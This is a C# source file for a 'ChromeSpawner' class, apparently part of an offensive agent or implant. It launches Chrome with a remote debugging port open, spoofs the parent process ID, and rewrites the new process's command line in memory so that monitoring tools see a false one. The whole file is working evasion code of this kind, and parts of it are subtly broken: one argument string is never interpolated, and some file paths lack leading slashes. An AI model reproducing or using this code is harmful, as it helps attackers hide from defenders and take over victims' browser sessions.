using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Agent
{
    public class ChromeSpawner : ISpawner
    {
        public Config config;
        public ChromeSpawner(Config config)
        {
            this.config = config;
        }
        public bool Spawn()
        {
            return TryLaunchProcess();
        }
        private string FindChromePath()
        {
            List<string> searchPaths;

            if (!string.IsNullOrEmpty(this.config.path))
            {
                //User Override
                return this.config.path;
            }

            if (OperatingSystem.IsWindows())
            {
                searchPaths = new List<string>()
                {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Google", "Chrome", "Application", "chrome.exe"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Google", "Chrome", "Application", "chrome.exe")
                };
            }
            else if (OperatingSystem.IsMacOS())
            {
                searchPaths = new List<string>()
                {
                    Path.Combine("Applications","Google Chrome.app","Contents","MacOS","Google Chrome")
                };
            }
            else if (OperatingSystem.IsLinux())
            {
                searchPaths = new List<string>()
                {
                    Path.Combine("opt","google","chrome","google-chrome"),
                    Path.Combine("usr","bin","google-chrome")
                };
            }
            else
            {
                return String.Empty;
            }

            foreach (var path in searchPaths)
            {
                if (File.Exists(path))
                {
                    return path;
                }
                Console.WriteLine(path + " doesn't exist.");
            }

            return String.Empty;

        }
        public bool TryLaunchProcessWindows()
        {
            string real = $"\"{this.FindChromePath()}\" --remote-debugging-port={this.config.debug_port}";
            string original_cmdline;
            
            if (!String.IsNullOrEmpty(this.config.cmdline))
            {
                original_cmdline = ("\"" + this.FindChromePath() + "\" " + this.config.cmdline).PadRight(real.Length, ' ');
            }
            else
            {
                original_cmdline = real;
            }

            var pInfo = new Native.PROCESS_INFORMATION();

            if (this.config.parent > 0)
            {
                if (!TryCreateProcessPPID(original_cmdline, this.config.parent, out pInfo))
                {
                    return false;
                }
            }
            else
            {
                //Honestly if you don't care enough to re-parent the process, I doubt you're going to care about cmdline args
                Process proc = new Process()
                {
                    StartInfo = new ProcessStartInfo()
                    {
                        FileName = this.FindChromePath(),
                        Arguments = "--remote-debugging-port={this.config.debug_port}",
                    }
                };
                return proc.Start();
            }

            if (!String.IsNullOrEmpty(this.config.cmdline))
            {
                TrySpoofCommandLine(real, pInfo);
            }


            Native.ResumeThread(pInfo.hThread);
            if (pInfo.hThread != IntPtr.Zero)
            {
                Native.CloseHandle(pInfo.hThread);
            }
            return true;

        }
        private Object FindObjectAddress(IntPtr BaseAddress, Object StructObject, IntPtr Handle)
        {
            IntPtr ObjAllocMemAddr = Marshal.AllocHGlobal(Marshal.SizeOf(StructObject.GetType()));
            Native.RtlZeroMemory(ObjAllocMemAddr, Marshal.SizeOf(StructObject.GetType()));

            uint getsize = 0;
            bool return_status = false;

            return_status = Native.NtReadVirtualMemory(
                Handle,
                BaseAddress,
                ObjAllocMemAddr,
                (uint)Marshal.SizeOf(StructObject),
                ref getsize
                );

            StructObject = Marshal.PtrToStructure(ObjAllocMemAddr, StructObject.GetType());
            return StructObject;
        }

        public bool TryCreateProcessPPID(string cmdline, int parentProcessId, out Native.PROCESS_INFORMATION pi)
        {
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
            //const int SW_HIDE = 0;

            var pInfo = new Native.PROCESS_INFORMATION();
            var sInfoEx = new Native.STARTUPINFOEX();

            sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
            sInfoEx.StartupInfo.dwFlags = 1;
            //sInfoEx.StartupInfo.wShowWindow = SW_HIDE;

            IntPtr lpValue = IntPtr.Zero;

            bool result;

            try
            {
                var lpSize = IntPtr.Zero;
                var success = Native.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                if (success || lpSize == IntPtr.Zero)
                {
                    pi = pInfo;
                    return false;
                }

                sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                success = Native.InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);
                if (!success)
                {
                    pi = pInfo;
                    return false;
                }

                var parentHandle = Native.OpenProcess((uint)Native.ProcessAccessFlags.All, false, parentProcessId); ;

                lpValue = Marshal.AllocHGlobal(IntPtr.Size);

                Marshal.WriteIntPtr(lpValue, parentHandle);

                if (!Native.UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
                {
                    pi = pInfo;
                    return false;
                }


                var pSec = new Native.SECURITY_ATTRIBUTES();
                var tSec = new Native.SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);

                result = Native.CreateProcess(
                    null,
                    cmdline,
                    pSec,
                    tSec,
                    true,
                    Native.CreateProcessFlags.CREATE_SUSPENDED |
                    Native.CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT |
                    Native.CreateProcessFlags.CREATE_NEW_CONSOLE,
                    IntPtr.Zero,
                    null,
                    ref sInfoEx,
                    out pInfo
                );
            }
            finally
            {
                //// Free the attribute list
                if (sInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    Native.DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                }
                Marshal.FreeHGlobal(lpValue);

                // Close process and thread handles
                if (pInfo.hProcess != IntPtr.Zero)
                {
                    Native.CloseHandle(pInfo.hProcess);
                }
            }

            pi = pInfo;
            return result;
        }


        public Native.NTSTATUS TrySpoofCommandLine(string spoofedCmdLine, Native.PROCESS_INFORMATION PROCESS_INFORMATION_instance)
        {
            Native.PROCESS_BASIC_INFORMATION PROCESS_BASIC_INFORMATION_instance = new Native.PROCESS_BASIC_INFORMATION();
            IntPtr ProcessHandle = Native.OpenProcess((uint)Native.ProcessAccessFlags.All, false, PROCESS_INFORMATION_instance.dwProcessId);

            uint sizePtr = 0;

            UInt32 QueryResult = Native.NtQueryInformationProcess(
                ProcessHandle,
                0,
                ref PROCESS_BASIC_INFORMATION_instance,
                Marshal.SizeOf(PROCESS_BASIC_INFORMATION_instance),
                ref sizePtr
            );

            Native.PEB PEB_instance = new Native.PEB();
            PEB_instance = (Native.PEB)FindObjectAddress(
                PROCESS_BASIC_INFORMATION_instance.PebBaseAddress,
                PEB_instance,
                ProcessHandle);

            Native.RTL_USER_PROCESS_PARAMETERS RTL_USER_PROCESS_PARAMETERS_instance = new Native.RTL_USER_PROCESS_PARAMETERS();
            RTL_USER_PROCESS_PARAMETERS_instance = (Native.RTL_USER_PROCESS_PARAMETERS)FindObjectAddress(
                PEB_instance.ProcessParameters64,
                RTL_USER_PROCESS_PARAMETERS_instance,
                ProcessHandle);

            int cmdLine_Length = 2 * spoofedCmdLine.Length;
            int cmdLine_MaximumLength = 2 * spoofedCmdLine.Length + 2;
            IntPtr real_command_addr = Marshal.StringToHGlobalUni(spoofedCmdLine);

            Native.NTSTATUS ntstatus = new Native.NTSTATUS();
            int OriginalCommand_length = (int)RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.Length;
            IntPtr com_zeroAddr = Marshal.AllocHGlobal(OriginalCommand_length);
            Native.RtlZeroMemory(com_zeroAddr, OriginalCommand_length);

            // rewrite the memory with 0x00 and then write it with real command
            ntstatus = Native.NtWriteVirtualMemory(
                ProcessHandle,
                RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.buffer,
                com_zeroAddr,
                (uint)OriginalCommand_length,
                ref sizePtr);

            ntstatus = Native.NtWriteVirtualMemory(
                ProcessHandle,
                RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.buffer,
                real_command_addr,
                (uint)cmdLine_Length,
                ref sizePtr);

            return ntstatus;
        }

        public bool TryLaunchProcessNix()
        {
            return false;
        }
        
        public bool TryLaunchProcess()
        {
            if (OperatingSystem.IsWindows())
            {
                return this.TryLaunchProcessWindows();
            }
            else
            {
                return this.TryLaunchProcessNix();
            }
        }

    }
}
